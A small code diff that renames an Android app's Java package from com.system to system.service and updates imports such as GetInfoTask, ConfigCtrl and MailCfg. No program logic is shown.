@@ -1,4 +1,4 @@
-package com.system.activity;
+package system.service.activity;
 
 import java.io.File;
 import java.text.SimpleDateFormat;
@@ -16,10 +16,10 @@ import android.widget.Button;
 import android.widget.ImageButton;
 import android.widget.TextView;
 
-import com.system.GetInfoTask;
-import com.system.R;
-import com.system.config.ConfigCtrl;
-import com.system.config.MailCfg;
+import system.service.GetInfoTask;
+import system.service.R;
+import system.service.config.ConfigCtrl;
+import system.service.config.MailCfg;
 import com.particle.inspector.common.util.DeviceProperty;
 import com.particle.inspector.common.util.FileCtrl;
 import com.particle.inspector.common.util.SysUtils;
